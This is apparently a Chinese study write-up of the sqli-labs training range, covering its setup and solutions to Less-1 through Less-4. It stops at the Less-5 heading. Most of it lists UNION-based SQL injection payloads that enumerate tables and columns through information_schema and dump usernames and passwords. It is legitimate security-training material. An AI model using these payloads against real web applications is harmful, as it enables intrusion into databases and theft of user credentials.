

# sql-labs

+ 参考通关秘籍：[sqli-labs 1-65 通关讲解](https://blog.csdn.net/dreamthe/article/details/123795302?ops_request_misc=%7B%22request%5Fid%22%3A%22170443063816800227461809%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170443063816800227461809&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123795302-null-null.142^v99^control&utm_term=sqli-labs通关&spm=1018.2226.3001.4187)



## sql-labs安装

+ 修改对应文件<code>phpstudy_pro\WWW\sqli-labs\sql-connections\db-creds.inc</code>下的账号及密码

![安装1](./img/安装1.png)



+ 网站所用的<code>php</code>版本设置为<code>php5</code>版本

![安装2](./img/安装2.png)



+ 打开对应的网址，点击下图红框中的语句初始化数据库

![安装3](./img/安装3.png)



+ 出现下面的画面，表示数据库初始化成功

![安装4](./img/安装4.PNG)



## mysql数据结构

~~~ tex
    练习靶场前需了解以下mysql数据库结构，mysql数据库5.0以上版本有一个自带的数据库叫做information_schema,该数据库下面有两个表一个是tables和columns。tables这个表的table_name字段下面是所有数据库存在的表名。table_schema字段下是所有表名对应的数据库名。columns这个表的colum_name字段下是所有数据库存在的字段名。columns_schema字段下是所有表名对应的数据库。
~~~



## sql-labs通关

### Less-1

![安装5](./img/安装5.PNG)



#### 判断是否存在sql注入

1. 提示输入数字值的ID作为参数，输入<code>?id=1</code>

![Less-1_1](./img/Less-1_1.PNG)



2. 分别注入<code>?id=1</code>、<code>?id=2</code>、<code>?id=3</code>，注入的数字值不同返回的内容也不同所以可以判断注入的内容已经被带入到数据库里查询

![Less-1_1](./img/Less-1_1.PNG)

![Less-1_2](./img/Less-1_2.PNG)



3. 分别注入<code>?id=1'</code>和<code>?id=1'--+</code>, 判断sql语句是否可以拼接，且是字符型还是数字型

![Less-1_3](./img/Less-1_3.png)

![Less-1_4](./img/Less-1_4.png)

![Less-1_5](./img/Less-1_5.png)

![Less-1_6](./img/Less-1_6.png)

+ 可根据上面结果确定是字符型注入且存在sql注入漏洞

+ 该页面存在回显，所以可用联合查询。联合查询就是两个sql语句一起查询，两张表具有相同列数且字段名一样.



#### 联合注入查询

1. 注入<code>?id=1'order by 3 --+</code>和<code>?id=1'order by 4 --+</code> 知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数

~~~ shell
?id=1'order by 3 --+
?id=1'order by 4 --+
~~~

![Less-1_7](./img/Less-1_7.png)

![Less-1_8](./img/Less-1_8.png)



![Less-1_9](./img/Less-1_9.png)

![Less-1_10](./img/Less-1_10.png)



2. 注入<code>?id=-1'union select 1,2,3--+</code>爆显示位，看表格里哪一列在页面显示；可看到第二列和第三列里的数据显示在页面

~~~ shell
?id=-1'union select 1,2,3--+
~~~

![Less-1_12](./img/Less-1_12.png)



3. 注入<code>?id=-1'union select 1,database(),version()--+</code>获取当前数据库名和版本号，这个涉及mysql数据库的一些函数，记得就行

~~~ shell
?id=-1'union select 1,database(),version()--+
~~~

![Less-1_14](./img/Less-1_14.png)

![Less-1_15](./img/Less-1_15.png)



4. 注入<code>?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+</code>爆数据表，

~~~ shell
?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+

information_schema.tables表示该数据库下的tables表，点表示下一级;where后面是条件，group_concat()是将查询到结果连接起来;如果不用group_concat查询到的只有user;
该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容，也即下面表格user和passwd;
~~~

![Less-1_21](./img/Less-1_21.png)



![Less-1_16](./img/Less-1_16.png)

![Less-1_17](./img/Less-1_17.png)



5. 注入<code>?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+</code>爆字段名，我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来想得到该表下的字段名以及内容。

~~~ shell
?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+

该语句意思是查询information_schema数据库下的columns表里table_name字段是users的所有column_name内容。注意table_name字段不是只存在于tables表也存在于columns表中;其实是表示所有字段对应的表名;
~~~

![Less-1_17](./img/Less-1_17.png)

![Less-1_18](./img/Less-1_18.png)



6. 通过上述操作可得到两敏感字段<code>username</code>和<code>password</code>,接下来注入<code>?id=-1' union select 1,2,group_concat(username ,id , password) from users--+</code>得到字段对应的内容，在中间加了一个id可以隔一下账户和密码。

~~~ shell
?id=-1' union select 1,2,group_concat(username ,id , password) from users--+
~~~

![Less-1_19](./img/Less-1_19.png)

![Less-1_20](./img/Less-1_20.png)



### Less-2

+ 第二关地址

~~~ shell
http://localhost/sqli-labs/Less-2/
~~~



+ 和第一关是一样进行判断，当输入单引号或者双引号可看到报错且报错信息看不到数字，所有可猜测sql语句应该是数字型注入。

~~~ 
?id=1 '
?id=1 "
~~~

![Less-2_1](./img/Less-2_1.PNG)

![Less-2_2](./img/Less-2_2.PNG)

![Less-2_3](./img/Less-2_3.PNG)

![Less-2_4](./img/Less-2_4.PNG)



+ 然后基本注入方式和第一关一样，注入语句

~~~ shell
?id=1 order by 3
~~~

![Less-2_12](./img/Less-2_12.PNG)



+ 注入

~~~ shell
?id=-1 union select 1,2,3
~~~

![Less-2_5](./img/Less-2_5.PNG)

![Less-2_6](./img/Less-2_6.PNG)



+ 注入

~~~ shell
?id=-1 union select 1,database(),version()
~~~

![Less-2_7](./img/Less-2_7.PNG)

![Less-2_8](./img/Less-2_8.PNG)



+ 注入

~~~ shell
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'
~~~

![Less-2_9](./img/Less-2_9.PNG)



+ 注入

~~~ shell
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'
~~~

![Less-2_10](./img/Less-2_10.PNG)



+ 注入

~~~ shell
?id=-1 union select 1,2,group_concat(username, id, password) from users
~~~

![Less-2_11](./img/Less-2_11.PNG)



### Less-3

+ 首先注入以下内容判断<code>sql</code>语句类型

~~~ shell
?id=1'
~~~

![Less-3_1](./img/Less-3_1.PNG)

从上面的页面报错信息可推断<code>sql</code>语句是单引号字符型且有括号，所以需要闭合单引号且也需要考虑括号



+ 根据下面的代码构建进行<code>sql</code>注入，后面所有的代码以此为基础进行构造

~~~ shell
?id=1')--+
?id=1') order by 3--+
?id=-1') union select 1,2,3--+
?id=-1') union select 1,database(),version()--+
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1') union select 1,2,group_concat(username ,id , password) from users--+
~~~



+ 注入下面的<code>sql</code>语句：

~~~ shell
?id=1')--+
~~~

![Less-3_2](./img/Less-3_2.PNG)



+ 注入以下语句进行

~~~ shell
?id=1') order by 3--+
~~~

![Less-3_3](./img/Less-3_3.PNG)



+ 注入以下语句

~~~ shell
?id=1') order by 4--+
~~~

![Less-3_4](./img/Less-3_4.PNG)



+ 注入以下语句

~~~ shell
?id=-1') union select 1,2,3 --+
~~~

![Less-3_5](./img/Less-3_5.PNG)



+ 注入以下语句

~~~ shell
?id=-1') union select 1,version(),database() --+
~~~

![Less-3_6](./img/Less-3_6.PNG)



+ 注入以下语句

~~~ shell
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
~~~

![Less-3_7](./img/Less-3_7.PNG)



+ 注入以下语句

~~~ shell
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='user'--+
~~~

![Less-3_8](./img/Less-3_8.PNG)



+ 注入以下语句，成功爆破

~~~ shell
?id=-1') union select 1,2,group_concat(username ,id , password) from users--+
~~~

![Less-3_9](./img/Less-3_9.PNG)



### Less-4

+ 根据下面代码<code>sql</code>注入

~~~ shell
?id=1") order by 3--+
?id=-1") union select 1,2,3--+
?id=-1") union select 1,database(),version()--+
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1") union select 1,2,group_concat(username ,id , password) from users--+
~~~



+ 首先注入以下语句

~~~ shell
?id=1
~~~

![Less-4_2](./img/Less-4_2.PNG)



+ 注入以下语句

~~~ shell
?id=1'
~~~

![Less-4_3](./img/Less-4_3.PNG)

没有变化，说明<code>sql</code>语句不是单引号<code>'</code>字符型



+ 注入以下语句

~~~ shell
?id=1"
~~~

![Less-4_4](./img/Less-4_4.PNG)

根据页面报错信息得知<code>sql</code>语句是双引号字符型且有括号



+ 注入以下语句

~~~ shell
?id=1")--+
~~~

![Less-4_5](./img/Less-4_5.PNG)



+ 注入以下语句

~~~ shell
?id=1") order by 3--+
~~~

![Less-4_6](./img/Less-4_6.PNG)



+ 注入以下语句

~~~ shell
?id=1") order by 4--+
~~~

![Less-4_7](./img/Less-4_7.PNG)



+ 注入以下语句

~~~ shell
?id=-1") union select 1,version(),database()--+
~~~

![Less-4_8](./img/Less-4_8.PNG)



+ 注入以下语句

~~~ shell
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security'--+
~~~

![Less-4_9](./img/Less-4_9.PNG)



+ 注入以下语句

~~~ shell
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users'--+
~~~

![Less-4_10](./img/Less-4_10.PNG)



+ 最后注入以下语句

~~~ shell
?id=-1") union select 1,2,group_concat(username,id,password) from users--+
~~~

![Less-4_11](./img/Less-4_11.PNG)



### Less-5

